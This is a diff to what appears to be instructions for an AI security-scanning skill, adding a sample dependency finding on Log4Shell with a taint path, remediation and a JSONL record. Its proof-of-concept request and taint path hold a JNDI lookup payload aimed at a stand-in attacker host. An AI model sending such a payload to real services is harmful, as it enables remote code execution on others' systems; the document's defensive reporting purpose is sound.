@@ -94,20 +94,57 @@ Do not recommend broad major-version upgrades unless the vulnerable line is end-
 
 ## Finding Format
 
-Emit findings using `.github/schemas/finding.schema.json`.
+Follow the canonical format from `copilot-instructions.md`. Example:
 
-Recommended CWE values:
+```
+### [CRITICAL] Vulnerable Dependency — Log4j 2.14.1 with Reachable JNDI Lookup (Log4Shell)
 
-- `CWE-1104` for use of unmaintained third-party components
-- `CWE-937` for known vulnerable component use
-- vulnerability-specific CWE when a reachable exploit path is confirmed
+**ID:** DEP-001
+**File:** `pom.xml:34`
+**CWE:** CWE-937 | **OWASP:** A06:2021-Vulnerable and Outdated Components
+**CVSS (estimated):** 10.0 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
+**Confidence:** High
+**Skill:** `sast-dependency`
 
-Example sink names:
+**Taint Path:**
+`log4j-core 2.14.1 (pom.xml:34)` → `log.error(userInput) (OrderController.java:78)` → `Log4j JndiLookup` evaluates `${jndi:ldap://attacker.com/a}` in user-controlled string
 
-- `pom.xml dependency`
-- `Gradle dependency`
-- `ObjectMapper.activateDefaultTyping()`
-- `Log4j JndiLookup`
+**Vulnerable Code:**
+```xml
+<!-- pom.xml line 34 -->
+<dependency>
+    <groupId>org.apache.logging.log4j</groupId>
+    <artifactId>log4j-core</artifactId>
+    <version>2.14.1</version>  <!-- vulnerable: CVE-2021-44228 -->
+</dependency>
+```
+Reachability confirmed: `log.error("Order failed for: " + request.getParameter("orderId"))` at `OrderController.java:78`
+
+**Why Exploitable:**
+Log4j 2.14.1 evaluates JNDI lookups in log messages. User-supplied input reaching any logger call can trigger an outbound LDAP/RMI request to an attacker-controlled server, followed by class loading and RCE.
+
+**Proof-of-Concept:**
+```http
+POST /api/orders HTTP/1.1
+Content-Type: application/json
+
+{"orderId": "${jndi:ldap://attacker.com/exploit}"}
+```
+
+**Remediation:**
+Upgrade to `log4j-core >= 2.17.1`. If upgrade is blocked, set `-Dlog4j2.formatMsgNoLookups=true` as a temporary mitigation.
+
+**References:** CVE-2021-44228, https://cwe.mitre.org/data/definitions/937.html, OWASP A06:2021
+```
+
+Recommended CWEs: `CWE-937` (known vulnerable component), `CWE-1104` (unmaintained component), or the vulnerability-specific CWE when a reachable exploit path is confirmed.
+
+Recommended sink names: `pom.xml dependency`, `Gradle dependency`, `ObjectMapper.activateDefaultTyping()`, `Log4j JndiLookup`
+
+JSONL line (append to `.github/sast-findings.jsonl`):
+```json
+{"id":"DEP-001","skill":"sast-dependency","cwe":"CWE-937","owasp":"A06:2021-Vulnerable and Outdated Components","severity":"Critical","confidence":"High","file":"pom.xml","line":34,"method":"","class":"","evidence":"<artifactId>log4j-core</artifactId>\n<version>2.14.1</version>","sink":"Log4j JndiLookup (reachable via OrderController.java:78)","source":"request.getParameter(\"orderId\") logged at OrderController.java:78","taint_path":[{"step":"log.error concatenates user input","file":"src/main/java/com/example/OrderController.java","line":78}],"sanitizer_present":false,"sanitizer_detail":"","remediation":"Upgrade log4j-core to >= 2.17.1; interim: set -Dlog4j2.formatMsgNoLookups=true","references":["CVE-2021-44228","https://cwe.mitre.org/data/definitions/937.html"],"false_positive_indicators":["vulnerable feature not reachable from application code"],"duplicate_of":null}
+```
 
 ---
 
